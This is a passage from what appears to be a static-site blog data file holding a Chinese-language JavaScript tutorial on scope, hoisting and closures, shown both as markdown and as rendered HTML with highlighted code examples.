2\n// 如果js是动态作用域，那么应该会输出 3\n```\n\n### 3、词法作用域\n\n在 JavaScript 中采用词法作用域，即代码在编写过程中体现出来的作用范围，代码一旦写好，不用执行，作用范围就已经确定好了（大部分情况如此，this、with、eval除外）， 这就是所谓的词法作用域。\n\n作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，直到遇见第一个匹配的标识符为止。\n\n在多层的嵌套作用域中可以定义同名的标识符，这叫作**遮蔽效应**（内部的标识符遮蔽了外部的标识符）\n\n> 全局变量会自动成为全局对象（比如浏览器中的 window 对象）的属性，因此可以不直接通过全局对象的词法名称，而是间接地通过对全局对象属性的引用来对其进行访问。\n\n在 JavaScript 中词法作用域规则:\n* 函数允许访问函数外的数据\n* 整个代码结构中只有函数可以限定作用域（ES6 新增块级作用域）\n* 作用规则首先使用提升规则分析\n* 通过作用域链进行查找，如果当前作用规则作用域中已查找到，则不再往父作用域查找\n\n### 4、词法欺骗\n\n##### 4.1 eval\n\nJavaScript 中的 `eval()` 函数可以接受一个字符串为参数，并将其中的内容视为好像在书写时就存在于程序中这个位置的代码。`eval()` 在运行期修改了书写期的词法作用域。\n\n换句话说，可以在你写的代码中用程序生成代码并运行，就好像代码是写在那个位置的一样。`eval()` 通过代码欺骗和假装成书写时（也就是词法期），来实现修改词法作用域环境的。\n\n```js\nfunction foo(str, a) {\n    eval( str ); // 欺骗！\n    console.log( a, b );\n}\nvar b = 2;\nfoo( \"var b = 3;\", 1 ); // 1, 3\n\n// 码实际上在 foo(..) 内部创建了一个变量 b ，并遮蔽了外部（全局）作用域中的同名变量\n```\n\n##### 4.2 with\n\nwith 通常被当作重复引用同一个对象中的多个属性的快捷方式，可以不需要重复引用对象本身。\n\n```js\nfunction foo(obj) {\n    with (obj) {\n        a = 2;\n    }\n}\nvar o1 = { a: 3 };\nvar o2 = { b: 3 };\nfoo( o1 );\nconsole.log( o1.a ); // 2\nfoo( o2 );\nconsole.log( o2.a ); // undefined\nconsole.log( a );    // 2——不好，a 被泄漏到全局作用域上了！\n\n// o2 的作用域、 foo(..) 的作用域和全局作用域中都没有找到标识符 a ，因此当 a＝2 执行时，\n// 自动创建了一个全局变量（因为是非严格模式）。\n```\n\n**总结：**\n* eval() 函数如果接受了含有一个或多个声明的代码，就会修改其所处的词法作用域。\n* with 声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域。   \n* 严格模式下，eval() 和 with 功能受限制\n* 如果出现了 eval() 或 with ，所有的优化可能都是无意义的，因此最简单的做法就是完全不做任何优化。\n\n\n### 5、函数作用域\n\n函数作用域：指属于这个函数的全部变量都可以在整个函数的范围内使用及复用（包括嵌套的作用域）。\n\n立即执行函数表达式：（Immediately Invoked Function Expression）\n\n```js\nvar a = 2;\n(function IIFE(global, undefined) {\n    var a = 3;\n    console.log( a ); // 3\n    console.log( global.a ); // 2\n})(window);\n\nconsole.log( a ); // 2\n\n// 将 window 对象的引用传递进去，使得对全局对象的引用变得比引用一个没有“全局”字样的变量更加清晰\n// 解决 undefined 标识符的默认值被错误覆盖导致的异常\n```\n\n### 6、块作用域\n\n块作用域：指变量和函数属于所处的作用域在某个代码块中（通常指 { .. } 内部）\n\n> let 为其声明的变量隐式地创建了块级作用域\n> 使用块作用域更加主流，也便于开发、维护\n\n\n### 7、变量提升\n\n提升：无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。可以将这个过程形象地想象成所有的声明（变量和函数）都会被“移动”到各自作用域的最顶端。\n\n* 只有声明本身会被提升，而赋值或其他运行逻辑会留在原地\n* 函数声明会被提升，但是函数表达式却不会被提升\n* 函数声明和变量声明都会被提升。但函数会首先被提升，然后才是变量\n* 在每个作用域中都会被提升，包括全局作用域、函数作用域、块级作用域\n\n以 `var a = 2; `为例，JavaScript 会看做两部分 `var a;` 和 `a = 2;`，第一个定义声明是在编译阶段进行的，第二个赋值声明会被留在原地等待执行阶段。\n\n\n```js\n// 变量声明会被提升\nfunction foo() {\n    var a;\n    console.log( a ); // undefined\n    a = 2;\n}\nfoo();\n```\n\n```js\n// 函数表达式不会被提升\nfoo(); // 不是 ReferenceError, 而是 TypeError!\nvar foo = function bar() {\n    console.log(12312);\n};\n```\n\n```js\nfoo(); // 1\nvar foo;\nfunction foo() {\n    console.log( 1 );\n}\nfoo = function() {\n    console.log( 2 );\n};\n\n// ----- output -------\n// 输出：1\n// ----- javascript 理解成如下形式 -----\n// function foo() {\n//      console.log( 1 );\n// }\n// foo(); // 1\n// foo = function() {\n//      console.log( 2 );\n// }; \n```\n\n### 8、闭包\n\n概念：当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。\n\n作用：\n1. 变量和对象的私有化\n2. 数据缓存\n3. 模块化\n\n```js\nfunction wait(message) {\n    setTimeout(function timer() {\n        console.log(message);\n    }, 1000);\n}\nwait( \"Hello, closure!\" );\n\n// 将一个内部函数（名为 timer ）传递给 setTimeout(..) 。\n// timer 具有涵盖 wait(..) 作用域的闭包，因此还保有对变量 message 的引用。\n// wait(..) 执行 1000 毫秒后，它的内部作用域并不会消失， timer 函数依然保有 wait(..) 作用域的闭包\n```\n\n> 在定时器、事件监听器、Ajax 请求、跨窗口通信、Web Workers 或者任何其他的异步（或者同步）任务中，只要使用了回调函数，实际上就是在使用闭包\n\n### 9、闭包与循环\n\n```js\nfor (var i=1; i<=5; i++) {\n    setTimeout(function timer() {\n        console.log(i);\n    }, i*1000);\n}\n// outupt ----> 6 6 6 6 6\n// 原因：所有的 `i` 被封闭在一个共享的全局作用域中，因此实际上只有一个 `i`\n```\n\n```js\nfor (var i=1; i<=5; i++) {\n    (function() {\n        setTimeout(function timer() {\n            console.log( i );\n        }, i*1000);\n    })();\n}\n// outupt ----> 6 6 6 6 6\n// 原因：每个函数都是一个作用域，但这个作用域是空的，当查询 `i` 时，依然会从父作用域中查找，实际上是一个 `i`\n```\n\n```js\nfor (var i=1; i<=5; i++) {\n    (function() {\n        var j = i;\n        setTimeout(function timer() {\n            console.log( j );\n        }, j*1000);\n    })();\n}\n\nfor (var i=1; i<=5; i++) {\n    (function(j) {\n        setTimeout(function timer() {\n            console.log( j );\n        }, j*1000);\n    })(i);\n}\n// outupt ----> 1 2 3 4 5\n// 原因：IIFE 会为每个迭代都生成一个新的作用域，都有自己的变量，用 `j` 保存 `i` 的值\n```\n\n```js\nfor (var i=1; i<=5; i++) {\n    let j = i; // 产生了新的块级作用域！\n    setTimeout(function timer() {\n        console.log(j);\n    }, j*1000);\n}\n\nfor (let i=1; i<=5; i++) {\n    setTimeout(function timer() {\n        console.log(i);\n    }, i*1000);\n}\n// outupt ----> 1 2 3 4 5\n// 原因：变量 `i` 是 let 声明的，当前的i只在本轮循环有效，所以每一次循环的 `i` 其实都是一个新的变量, \n//      JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量 `i` 时，就在上一轮循环的基础上进行计算\n```\n\n```js\n// for 循环中 let 还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域\nfor (let i = 0; i < 3; i++) {\n  let i = 'abc';\n  console.log(i);\n}\n// ------ output ------\n// abc\n// abc\n// abc\n\n```\n\n### 10、闭包与模块\n\n模块：返回的对象中含有对内部函数而不是内部数据变量的引用，保持内部数据变量是隐藏且私有的状态，并提供公共的API\n\n```js\n// 模块模式\nfunction foo() {\n    var something = \"cool\";\n    var another = [1, 2, 3];\n    function doSomething() {\n        console.log(something);\n    }\n    function doAnother() {\n        console.log(another.join( \" ! \" ));\n    }\n\n    return {\n        doSomething,\n        doAnother\n    }\n}\n```\n\n模块模式的两个必要条件：\n1. 必须有外部的封闭函数，该函数必须至少被调用一次（每次调用都会创建一个新的模块实例）。\n2. 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并且可以访问或者修改私有的状态。","slug":"JavaScript/作用域与闭包","published":1,"updated":"2021-04-29T09:55:52.036Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cko3yr62i0000io6r8bch6y68","content":"<h1 id=\"作用域与闭包\"><a href=\"#作用域与闭包\" class=\"headerlink\" title=\"作用域与闭包\"></a>作用域与闭包</h1><h3 id=\"1、JavaScript-编译\"><a href=\"#1、JavaScript-编译\" class=\"headerlink\" title=\"1、JavaScript 编译\"></a>1、JavaScript 编译</h3><p>源代码在执行之前会进行编译，分为三个步骤：</p>\n<ol>\n<li>分词/词法分析：将由字符组成的字符串分解成有意义的代码块，这些代码块被称为词法单元</li>\n<li>解析/语法分析：将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST）</li>\n<li>代码生成：将 AST 转换为可执行代码（一组机器指令）</li>\n</ol>\n<blockquote>\n<p>JavaScript引擎要复杂些，在语法分析和代码生成阶段有特定的步骤来对运行性能进行优化，包括对冗余元素进行优化等。</p>\n</blockquote>\n<ul>\n<li>引擎：从头到尾负责整个 JavaScript 程序的编译及执行过程。</li>\n<li>编译器：负责语法分析及代码生成等脏活累活（详见前一节的内容）。</li>\n<li>作用域：负责收集并维护由所有声明的标识符（变量）组成的一系列查询，并实施一套非常严格的规则，确定当前执行的代码对这些标识符的访问权限。</li>\n</ul>\n<blockquote>\n<p>以变量赋值为例，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。</p>\n</blockquote>\n<h3 id=\"2-作用域\"><a href=\"#2-作用域\" class=\"headerlink\" title=\"2. 作用域\"></a>2. 作用域</h3><p>作用域：是一套规则，用于确定在何处以及如何查找变量（标识符）</p>\n<p>当一个块或函数嵌套在另一个块或函数中时，就发生了作用域嵌套。因此，在当前作用域中无法找到某个变量时，引擎就会在外层嵌套的作用域中继续查找，直到找到该变量，或抵达最外层的作用域（也就是全局作用域）为止。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 气泡1 （全局环境）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\">a</span>) </span>&#123; <span class=\"comment\">// 气泡2</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = a * <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span> (<span class=\"params\">c</span>) </span>&#123; <span class=\"comment\">// 气泡3</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(a, b, c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo(<span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>气泡1包含着整个全局作用域，其中只有一个标识符： foo 。</li>\n<li>气泡2包含着 foo 所创建的作用域，其中有三个标识符： a 、 bar 和 b 。</li>\n<li>气泡3包含着 bar 所创建的作用域，其中只有一个标识符： c 。</li>\n</ul>\n<p>作用域有两种工作模型：词法作用域、动态作用域</p>\n<blockquote>\n<p>词法作用域是在定义时确定的，关注函数在何处声明<br>动态作用域是在运行时确定的，关注函数从何处调用，其作用域链是基于运行时的调用栈的。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> a = <span class=\"number\">3</span>;</span><br><span class=\"line\">  foo();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">bar();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果js是词法作用域（就是），那么应该会输出 2</span></span><br><span class=\"line\"><span class=\"comment\">// 如果js是动态作用域，那么应该会输出 3</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、词法作用域\"><a href=\"#3、词法作用域\" class=\"headerlink\" title=\"3、词法作用域\"></a>3、词法作用域</h3><p>在 JavaScript 中采用词法作用域，即代码在编写过程中体现出来的作用范围，代码一旦写好，不用执行，作用范围就已经确定好了（大部分情况如此，this、with、eval除外）， 这就是所谓的词法作用域。</p>\n<p>作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，直到遇见第一个匹配的标识符为止。</p>\n<p>在多层的嵌套作用域中可以定义同名的标识符，这叫作<strong>遮蔽效应</strong>（内部的标识符遮蔽了外部的标识符）</p>\n<blockquote>\n<p>全局变量会自动成为全局对象（比如浏览器中的 window 对象）的属性，因此可以不直接通过全局对象的词法名称，而是间接地通过对全局对象属性的引用来对其进行访问。</p>\n</blockquote>\n<p>在 JavaScript 中词法作用域规则:</p>\n<ul>\n<li>函数允许访问函数外的数据</li>\n<li>整个代码结构中只有函数可以限定作用域（ES6 新增块级作用域）</li>\n<li>作用规则首先使用提升规则分析</li>\n<li>通过作用域链进行查找，如果当前作用规则作用域中已查找到，则不再往父作用域查找</li>\n</ul>\n<h3 id=\"4、词法欺骗\"><a href=\"#4、词法欺骗\" class=\"headerlink\" title=\"4、词法欺骗\"></a>4、词法欺骗</h3><h5 id=\"4-1-eval\"><a href=\"#4-1-eval\" class=\"headerlink\" title=\"4.1 eval\"></a>4.1 eval</h5><p>JavaScript 中的 <code>eval()</code> 函数可以接受一个字符串为参数，并将其中的内容视为好像在书写时就存在于程序中这个位置的代码。<code>eval()</code> 在运行期修改了书写期的词法作用域。</p>\n<p>换句话说，可以在你写的代码中用程序生成代码并运行，就好像代码是写在那个位置的一样。<code>eval()</code> 通过代码欺骗和假装成书写时（也就是词法期），来实现修改词法作用域环境的。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">str, a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">eval</span>( str ); <span class=\"comment\">// 欺骗！</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( a, b );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"number\">2</span>;</span><br><span class=\"line\">foo( <span class=\"string\">&quot;var b = 3;&quot;</span>, <span class=\"number\">1</span> ); <span class=\"comment\">// 1, 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 码实际上在 foo(..) 内部创建了一个变量 b ，并遮蔽了外部（全局）作用域中的同名变量</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-2-with\"><a href=\"#4-2-with\" class=\"headerlink\" title=\"4.2 with\"></a>4.2 with</h5><p>with 通常被当作重复引用同一个对象中的多个属性的快捷方式，可以不需要重复引用对象本身。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">with</span> (obj) &#123;</span><br><span class=\"line\">        a = <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> o1 = &#123; <span class=\"attr\">a</span>: <span class=\"number\">3</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> o2 = &#123; <span class=\"attr\">b</span>: <span class=\"number\">3</span> &#125;;</span><br><span class=\"line\">foo( o1 );</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( o1.a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\">foo( o2 );</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( o2.a ); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( a );    <span class=\"comment\">// 2——不好，a 被泄漏到全局作用域上了！</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// o2 的作用域、 foo(..) 的作用域和全局作用域中都没有找到标识符 a ，因此当 a＝2 执行时，</span></span><br><span class=\"line\"><span class=\"comment\">// 自动创建了一个全局变量（因为是非严格模式）。</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>总结：</strong></p>\n<ul>\n<li>eval() 函数如果接受了含有一个或多个声明的代码，就会修改其所处的词法作用域。</li>\n<li>with 声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域。   </li>\n<li>严格模式下，eval() 和 with 功能受限制</li>\n<li>如果出现了 eval() 或 with ，所有的优化可能都是无意义的，因此最简单的做法就是完全不做任何优化。</li>\n</ul>\n<h3 id=\"5、函数作用域\"><a href=\"#5、函数作用域\" class=\"headerlink\" title=\"5、函数作用域\"></a>5、函数作用域</h3><p>函数作用域：指属于这个函数的全部变量都可以在整个函数的范围内使用及复用（包括嵌套的作用域）。</p>\n<p>立即执行函数表达式：（Immediately Invoked Function Expression）</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">IIFE</span>(<span class=\"params\"><span class=\"built_in\">global</span>, <span class=\"literal\">undefined</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// 3</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( <span class=\"built_in\">global</span>.a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\">&#125;)(<span class=\"built_in\">window</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 将 window 对象的引用传递进去，使得对全局对象的引用变得比引用一个没有“全局”字样的变量更加清晰</span></span><br><span class=\"line\"><span class=\"comment\">// 解决 undefined 标识符的默认值被错误覆盖导致的异常</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6、块作用域\"><a href=\"#6、块作用域\" class=\"headerlink\" title=\"6、块作用域\"></a>6、块作用域</h3><p>块作用域：指变量和函数属于所处的作用域在某个代码块中（通常指 { .. } 内部）</p>\n<blockquote>\n<p>let 为其声明的变量隐式地创建了块级作用域<br>使用块作用域更加主流，也便于开发、维护</p>\n</blockquote>\n<h3 id=\"7、变量提升\"><a href=\"#7、变量提升\" class=\"headerlink\" title=\"7、变量提升\"></a>7、变量提升</h3><p>提升：无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。可以将这个过程形象地想象成所有的声明（变量和函数）都会被“移动”到各自作用域的最顶端。</p>\n<ul>\n<li>只有声明本身会被提升，而赋值或其他运行逻辑会留在原地</li>\n<li>函数声明会被提升，但是函数表达式却不会被提升</li>\n<li>函数声明和变量声明都会被提升。但函数会首先被提升，然后才是变量</li>\n<li>在每个作用域中都会被提升，包括全局作用域、函数作用域、块级作用域</li>\n</ul>\n<p>以 <code>var a = 2; </code>为例，JavaScript 会看做两部分 <code>var a;</code> 和 <code>a = 2;</code>，第一个定义声明是在编译阶段进行的，第二个赋值声明会被留在原地等待执行阶段。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 变量声明会被提升</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">    a = <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 函数表达式不会被提升</span></span><br><span class=\"line\">foo(); <span class=\"comment\">// 不是 ReferenceError, 而是 TypeError!</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">12312</span>);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo(); <span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> foo;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( <span class=\"number\">1</span> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( <span class=\"number\">2</span> );</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ----- output -------</span></span><br><span class=\"line\"><span class=\"comment\">// 输出：1</span></span><br><span class=\"line\"><span class=\"comment\">// ----- javascript 理解成如下形式 -----</span></span><br><span class=\"line\"><span class=\"comment\">// function foo() &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//      console.log( 1 );</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"><span class=\"comment\">// foo(); // 1</span></span><br><span class=\"line\"><span class=\"comment\">// foo = function() &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//      console.log( 2 );</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;; </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"8、闭包\"><a href=\"#8、闭包\" class=\"headerlink\" title=\"8、闭包\"></a>8、闭包</h3><p>概念：当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。</p>\n<p>作用：</p>\n<ol>\n<li>变量和对象的私有化</li>\n<li>数据缓存</li>\n<li>模块化</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">wait</span>(<span class=\"params\">message</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(message);</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">wait( <span class=\"string\">&quot;Hello, closure!&quot;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 将一个内部函数（名为 timer ）传递给 setTimeout(..) 。</span></span><br><span class=\"line\"><span class=\"comment\">// timer 具有涵盖 wait(..) 作用域的闭包，因此还保有对变量 message 的引用。</span></span><br><span class=\"line\"><span class=\"comment\">// wait(..) 执行 1000 毫秒后，它的内部作用域并不会消失， timer 函数依然保有 wait(..) 作用域的闭包</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>在定时器、事件监听器、Ajax 请求、跨窗口通信、Web Workers 或者任何其他的异步（或者同步）任务中，只要使用了回调函数，实际上就是在使用闭包</p>\n</blockquote>\n<h3 id=\"9、闭包与循环\"><a href=\"#9、闭包与循环\" class=\"headerlink\" title=\"9、闭包与循环\"></a>9、闭包与循环</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">    &#125;, i*<span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// outupt ----&gt; 6 6 6 6 6</span></span><br><span class=\"line\"><span class=\"comment\">// 原因：所有的 `i` 被封闭在一个共享的全局作用域中，因此实际上只有一个 `i`</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log( i );</span><br><span class=\"line\">        &#125;, i*<span class=\"number\">1000</span>);</span><br><span class=\"line\">    &#125;)();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// outupt ----&gt; 6 6 6 6 6</span></span><br><span class=\"line\"><span class=\"comment\">// 原因：每个函数都是一个作用域，但这个作用域是空的，当查询 `i` 时，依然会从父作用域中查找，实际上是一个 `i`</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 